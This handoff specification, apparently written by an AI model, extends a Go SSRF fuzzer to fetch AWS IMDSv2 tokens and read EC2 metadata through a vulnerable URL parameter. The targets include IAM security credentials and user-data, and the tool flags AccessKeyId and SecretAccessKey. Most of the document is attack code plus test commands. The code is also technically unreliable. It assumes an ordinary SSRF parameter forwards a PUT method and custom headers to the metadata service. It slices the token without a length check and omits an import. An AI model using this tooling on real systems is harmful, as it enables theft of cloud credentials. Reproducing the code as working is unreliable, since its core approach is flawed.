# Handoff: SSRF IMDSv2 Support for AWS EC2 Token-Based Metadata

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: HIGH
**Estimated Effort**: Medium (1-2 hours)
**Target Files**:
- `tools/go-ssrf-fuzzer/main.go`
- `tools/go-ssrf-fuzzer/fuzzer/fuzzer.go`
- `bugtrace/agents/ssrf_agent.py` (if exists)

---

## 1. Problem Statement

AWS introduced **IMDSv2** (Instance Metadata Service version 2) which requires a **session token** before accessing metadata. The current SSRF fuzzer only supports IMDSv1 (direct GET requests).

### Current State (IMDSv1 only)

From `go-ssrf-fuzzer/main.go`:
```go
if *includeCloud {
    payloads = append(payloads, []string{
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        // ...
    }...)
}
```

**Problem**: These requests will **fail on IMDSv2-only instances** because they lack the required token.

### IMDSv2 Flow

```
Step 1: PUT http://169.254.169.254/latest/api/token
        Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
        → Returns: TOKEN_STRING

Step 2: GET http://169.254.169.254/latest/meta-data/
        Header: X-aws-ec2-metadata-token: TOKEN_STRING
        → Returns: Metadata
```

---

## 2. Implementation Details

### 2.1 Update `main.go` - Add IMDSv2 Flag

```go
// Add new flag
imdsv2 := flag.Bool("imdsv2", true, "Attempt IMDSv2 token-based access (default: true)")
```

### 2.2 Update `fuzzer/fuzzer.go` - Add IMDSv2 Logic

Add a new function to attempt IMDSv2 token retrieval:

```go
package fuzzer

import (
    "net/http"
    "io"
    "time"
    "strings"
)

// IMDSv2Token attempts to get an AWS IMDSv2 session token via SSRF
// Returns the token if successful, empty string otherwise
func (f *Fuzzer) AttemptIMDSv2Token(targetURL string) string {
    // Replace the FUZZ marker with the token endpoint
    tokenURL := strings.Replace(targetURL, "FUZZ", "http://169.254.169.254/latest/api/token", 1)

    // Create PUT request
    req, err := http.NewRequest("PUT", tokenURL, nil)
    if err != nil {
        return ""
    }

    // IMDSv2 requires this header
    req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

    // Add user-provided headers
    for k, v := range f.config.Headers {
        req.Header.Set(k, v)
    }

    client := &http.Client{
        Timeout: f.config.Timeout,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Don't follow redirects
        },
    }

    resp, err := client.Do(req)
    if err != nil {
        return ""
    }
    defer resp.Body.Close()

    // Token should be in response body
    if resp.StatusCode == 200 {
        body, err := io.ReadAll(resp.Body)
        if err != nil {
            return ""
        }
        token := strings.TrimSpace(string(body))
        if len(token) > 0 && len(token) < 500 { // Sanity check
            return token
        }
    }

    return ""
}

// IMDSv2Payloads returns payloads with the token header
func IMDSv2Payloads(token string) []PayloadWithHeaders {
    endpoints := []string{
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    }

    var payloads []PayloadWithHeaders
    for _, endpoint := range endpoints {
        payloads = append(payloads, PayloadWithHeaders{
            URL: endpoint,
            Headers: map[string]string{
                "X-aws-ec2-metadata-token": token,
            },
        })
    }

    return payloads
}

// PayloadWithHeaders represents a payload that requires specific headers
type PayloadWithHeaders struct {
    URL     string
    Headers map[string]string
}
```

### 2.3 Update Run Function in `fuzzer.go`

Modify the main `Run` function to attempt IMDSv2:

```go
func Run(config Config) Result {
    f := &Fuzzer{config: config}
    result := Result{
        Hits:      []Hit{},
        StartTime: time.Now(),
    }

    // ================================================================
    // PHASE 1: Attempt IMDSv2 Token Retrieval
    // ================================================================
    var imdsv2Token string
    if config.AttemptIMDSv2 {
        imdsv2Token = f.AttemptIMDSv2Token(config.URL)
        if imdsv2Token != "" {
            log.Printf("[IMDSv2] Successfully obtained token: %s...", imdsv2Token[:20])

            // Add IMDSv2 payloads with token header
            imdsv2Payloads := IMDSv2Payloads(imdsv2Token)
            for _, p := range imdsv2Payloads {
                // Test each endpoint with the token
                hit := f.TestPayloadWithHeaders(p.URL, p.Headers)
                if hit != nil {
                    hit.Severity = "CRITICAL"
                    hit.Reason = "IMDSv2 Token Retrieved + Metadata Access"
                    result.Hits = append(result.Hits, *hit)
                }
            }
        }
    }

    // ================================================================
    // PHASE 2: Standard payload testing (existing logic)
    // ================================================================
    // ... existing concurrent testing logic ...

    return result
}

// TestPayloadWithHeaders tests a single payload with custom headers
func (f *Fuzzer) TestPayloadWithHeaders(payload string, headers map[string]string) *Hit {
    targetURL := strings.Replace(f.config.URL, "FUZZ", payload, 1)

    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return nil
    }

    // Add custom headers
    for k, v := range headers {
        req.Header.Set(k, v)
    }

    // Add config headers
    for k, v := range f.config.Headers {
        req.Header.Set(k, v)
    }

    client := &http.Client{
        Timeout: f.config.Timeout,
    }

    resp, err := client.Do(req)
    if err != nil {
        return nil
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)

    // Check for AWS metadata fingerprints
    if f.IsAWSMetadata(string(body)) {
        return &Hit{
            Payload:    payload,
            StatusCode: resp.StatusCode,
            BodySnippet: string(body)[:min(500, len(body))],
        }
    }

    return nil
}

func (f *Fuzzer) IsAWSMetadata(body string) bool {
    fingerprints := []string{
        "ami-id",
        "instance-id",
        "security-credentials",
        "AccessKeyId",
        "SecretAccessKey",
        "iam/",
        "meta-data/",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}
```

### 2.4 Update Config Struct

```go
type Config struct {
    URL           string
    Payloads      []string
    Concurrency   int
    Timeout       time.Duration
    Headers       map[string]string
    OOBURL        string
    AttemptIMDSv2 bool  // NEW: Attempt IMDSv2 token retrieval
}
```

### 2.5 Update `main.go` to Pass Flag

```go
config := fuzzer.Config{
    URL:           *urlFlag,
    Payloads:      payloads,
    Concurrency:   *concurrency,
    Timeout:       time.Duration(*timeout) * time.Second,
    Headers:       headerMap,
    OOBURL:        *oobURL,
    AttemptIMDSv2: *imdsv2,  // NEW
}
```

---

## 3. Testing

### Test IMDSv2 Token Retrieval

```bash
# On an EC2 instance with IMDSv2 enabled
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Returns: AQAEAFTr... (token)

# Then use it
curl -H "X-aws-ec2-metadata-token: AQAEAFTr..." \
     http://169.254.169.254/latest/meta-data/
```

### Test the Fuzzer

```bash
cd tools/go-ssrf-fuzzer
go build -o go-ssrf-fuzzer .

# Test with IMDSv2 enabled (default)
./go-ssrf-fuzzer -u "http://vulnerable.app/?url=FUZZ" -cloud -imdsv2

# Test with IMDSv2 disabled (for IMDSv1-only targets)
./go-ssrf-fuzzer -u "http://vulnerable.app/?url=FUZZ" -cloud -imdsv2=false
```

---

## 4. Detection Fingerprints

Add these to the response analysis:

| Fingerprint | Meaning | Severity |
|-------------|---------|----------|
| `AccessKeyId` | AWS credentials exposed | CRITICAL |
| `SecretAccessKey` | AWS credentials exposed | CRITICAL |
| `Token` (in IAM response) | Session token exposed | CRITICAL |
| `ami-id` | Instance metadata accessible | HIGH |
| `instance-id` | Instance metadata accessible | HIGH |
| `iam/security-credentials/` | IAM role accessible | CRITICAL |
| `user-data` | User data scripts accessible | HIGH |

---

## 5. Verification Checklist

- [ ] `main.go` has `-imdsv2` flag
- [ ] `fuzzer.go` has `AttemptIMDSv2Token` function
- [ ] Token is properly passed in `X-aws-ec2-metadata-token` header
- [ ] Build succeeds: `go build -o go-ssrf-fuzzer .`
- [ ] IMDSv2 endpoints are tested when token is obtained

---

## 6. Edge Cases

1. **IMDSv2 Required Mode**: Instance only allows IMDSv2 → Token required
2. **IMDSv2 Optional Mode**: Instance allows both → Try IMDSv1 first, then v2
3. **Hop Limit**: IMDSv2 has `HttpPutResponseHopLimit` (default 1) which prevents token retrieval from containers
4. **Token TTL**: Tokens expire after TTL seconds (max 21600 = 6 hours)

---

## 7. Success Criteria

1. Fuzzer can retrieve IMDSv2 tokens via SSRF
2. Metadata endpoints are accessed with proper token header
3. CRITICAL findings reported when credentials are exposed
4. Backward compatible with IMDSv1-only instances

